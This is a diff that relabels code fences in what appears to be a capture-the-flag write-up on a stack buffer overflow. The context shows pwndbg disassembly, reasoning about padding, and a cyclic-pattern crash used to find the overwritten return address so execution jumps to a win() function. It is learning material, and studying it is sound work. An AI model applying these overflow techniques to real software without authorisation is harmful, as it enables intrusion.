@@ -69,7 +69,7 @@ int main() {
 }
 ```
 
-```
+```x86asm
 So we understand that in order to get the flag we need to trigger the win() function.
 All we need to do is input the functions address and the programm will jump right to it.
 All we need to do is load the binary into pwndbg, disassemble win function, and :
@@ -231,7 +231,7 @@ Here I discovered two approaches: one (more nerdy and prone to error) and one th
 What we need to do is find out exactly how many "padding" we need to insert into our vulnerable input[] array. First though would be 17, and that does corrupt the buffer but it does not alter the value stored in the num variable's memory location, it's like breaking a glass into a house but only checking the entry hall.My initial approach was to see exactly where in memory resided input and num and then calculate how many *steps* in our case **bytes** i would need to access num's memory location. 
 Here is the disassembly:
 
-```
+```x86asm
 Dump of assembler code for function main:
    0x0000000000401236 <+0>:    endbr64
    0x000000000040123a <+4>:    push   rbp
@@ -315,7 +315,7 @@ as you can see win() is never called and is not after a vulnerable function, mea
 pwndbg> disass win
 ```
 
-```
+```x86asm
 Dump of assembler code for function win:
    0x080491f6 <+0>:	endbr32                #This is what interests us
    0x080491fa <+4>:	push   ebp
@@ -341,7 +341,8 @@ Using host libthread_db library "/nix/store/rcp9sdrrq8sfxkm5zdykglx7hd2gzbfy-gli
 Please enter your string:
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
-
+```
+```x86asm
 Program received signal SIGSEGV, Segmentation fault.
 0x6161616c in ?? ()
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
@@ -387,7 +388,8 @@ Invalid address 0x6161616c
    7 0x61616173 None
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────
 #we see that it crashed which is what we wanted₍^ >⩊< ^₎Ⳋ now we just have to look at the instruction pointer register
-
+```
+```bash
 pwndbg> info registers eip
 eip            0x6161616c          0x6161616c
 
